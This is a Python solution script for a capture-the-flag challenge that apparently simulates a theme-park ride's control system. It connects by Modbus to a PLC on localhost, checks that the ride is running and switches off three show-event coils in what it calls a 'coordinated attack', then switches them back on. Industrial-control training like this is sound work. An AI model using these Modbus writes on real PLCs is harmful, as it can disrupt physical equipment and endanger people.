#!/usr/bin/env python3
"""
Challenge 07: Scene Blackout (300 points)
Difficulty: Medium

Objective: Use Modbus to disable three or more show events simultaneously
while the ride is running.

Requirements:
- Ride must be running (state = 2)
- Disable at least 3 event coils via Modbus (coils 8-16)
- Must be direct Modbus writes, not UI control

Educational Value:
- Learn multi-coil manipulation
- Understand show control systems
- Practice coordinated attacks
"""

from pymodbus.client import ModbusTcpClient
import time

PLC_HOST = 'localhost'
MAIN_PLC_PORT = 502

def disable_multiple_events():
    """
    Disable 3+ events simultaneously
    """
    print("=" * 60)
    print("Challenge 07: Scene Blackout")
    print("=" * 60)
    print()

    client = ModbusTcpClient(PLC_HOST, port=MAIN_PLC_PORT)

    if not client.connect():
        print("✗ Failed to connect to Main PLC")
        return False

    print(f"✓ Connected to Main PLC at {PLC_HOST}:{MAIN_PLC_PORT}")
    print()

    # Check if ride is running
    result = client.read_holding_registers(2, 1, slave=1)
    if result.isError():
        print("✗ Failed to read ride state")
        client.close()
        return False

    state = result.registers[0]
    state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency']
    print(f"Current State: {state} ({state_names[state] if state < len(state_names) else 'Unknown'})")

    if state != 2:
        print()
        print("⚠️  Ride is not running!")
        print("   Start the ride first, then run this script.")
        client.close()
        return False

    print()
    print("Project Nexus Show Events:")
    print("  Event 1 (Coil 8):  Scene 1 - Portal Entry - Fog")
    print("  Event 2 (Coil 9):  Scene 1 - Portal Entry - Lighting")
    print("  Event 3 (Coil 10): Scene 2 - Time Vortex - Strobe")
    print("  Event 4 (Coil 11): Scene 4 - Portal Chamber - Photo Flash")
    print("  Event 5 (Coil 12): Scene 5 - Reality Junction - Laser")
    print("  Event 6 (Coil 13): Scene 6 - Convergence - Audio Cue 1")
    print("  Event 7 (Coil 14): Scene 7 - Final Reveal - Audio Cue 2")
    print("  Event 8 (Coil 15): Scene 8 - Exit Portal - Lighting")
    print("  Event 9 (Coil 16): Scene 8 - Exit Portal - Audio Cue 3")
    print()

    # Select events to disable
    events_to_disable = [10, 11, 12]  # Events 3, 4, 5
    event_names = ["Time Vortex Strobe", "Portal Chamber Photo", "Reality Junction Laser"]

    print(f"Disabling {len(events_to_disable)} events:")
    for i, coil in enumerate(events_to_disable):
        print(f"  • Event {coil - 7} (Coil {coil}): {event_names[i]}")
    print()

    print("Executing coordinated attack...")
    success_count = 0

    for i, coil in enumerate(events_to_disable):
        result = client.write_coil(coil, False, slave=1)
        if not result.isError():
            print(f"  ✓ Disabled {event_names[i]} (Coil {coil})")
            success_count += 1
            time.sleep(0.2)
        else:
            print(f"  ✗ Failed to disable {event_names[i]} (Coil {coil})")

    print()
    if success_count >= 3:
        print(f"✓ Successfully disabled {success_count} events!")
        print()
        print("⚠️  Multiple show scenes are now dark!")
        print("   Guests will experience gaps in the show sequence.")
        print()
        print("🎯 Challenge 07 should now be completed!")
        print("   Check the CTF dashboard to verify.")

        # Re-enable events after a moment
        time.sleep(3)
        print()
        print("Re-enabling events to restore show...")
        for coil in events_to_disable:
            client.write_coil(coil, True, slave=1)
            time.sleep(0.1)
        print("✓ Events re-enabled")

        client.close()
        return True
    else:
        print(f"✗ Only disabled {success_count} events, need at least 3")
        client.close()
        return False

if __name__ == "__main__":
    try:
        disable_multiple_events()
    except KeyboardInterrupt:
        print("\n\n✗ Attack interrupted by user")
    except Exception as e:
        print(f"\n✗ Attack failed: {e}")
